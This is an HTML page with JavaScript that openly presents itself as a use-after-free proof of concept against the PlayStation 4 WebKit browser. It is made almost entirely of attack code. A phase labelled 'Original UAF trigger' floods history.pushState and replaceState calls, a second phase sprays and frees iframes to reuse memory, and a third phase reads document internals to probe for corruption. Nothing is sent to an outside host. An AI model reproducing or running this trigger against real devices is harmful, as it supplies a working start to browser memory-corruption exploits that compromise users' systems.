<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Document Internal Read</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; }
button { font-size:16px; padding:10px; }
#log { white-space: pre-wrap; }
</style>
</head>

<body>
<h2>PS4 WebKit – Document Internal Field Touch</h2>
<button onclick="run()">RUN INTERNAL READ</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

async function run(){
    logEl.textContent = "";
    log("=== START ===");

    let size = 977;
    const STEP = 14461;

    // ----------------------------
    // Phase 1 – Original UAF trigger
    // ----------------------------
    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
        if(i % 6 === 0)
            setTimeout(()=>history.back(),0);
        size += STEP;
        await sleep(5);
    }

    log(">>> UAF WINDOW <<<");
    await sleep(120);

    // ----------------------------
    // Phase 2 – Document reuse
    // ----------------------------
    let frames = [];
    for(let i=0;i<80;i++){
        let f = document.createElement("iframe");
        document.body.appendChild(f);
        try {
            let d = f.contentDocument;
            d.open();
            d.write("<html><body>"+("X".repeat(2048))+"</body></html>");
            d.close();
        } catch(e){}
        frames.push(f);
    }
    frames.forEach(f=>f.remove());
    frames = null;

    await sleep(80);

    // ----------------------------
    // Phase 3 – INTERNAL READS
    // ----------------------------
    log("[READ] touching document internals");

    try { log("document.URL.length = " + document.URL.length); } catch(e){ log("URL error"); }
    try { log("document.domain = " + document.domain); } catch(e){ log("domain error"); }
    try { log("document.characterSet = " + document.characterSet); } catch(e){ log("charset error"); }
    try { log("document.readyState = " + document.readyState); } catch(e){ log("readyState error"); }

    // force layout access
    try {
        let w = document.body.offsetWidth;
        let h = document.body.offsetHeight;
        log("layout read ok w="+w+" h="+h);
    } catch(e){
        log("layout error");
    }

    log("history.length = " + history.length);
    log("=== END ===");
}
</script>
</body>
</html>
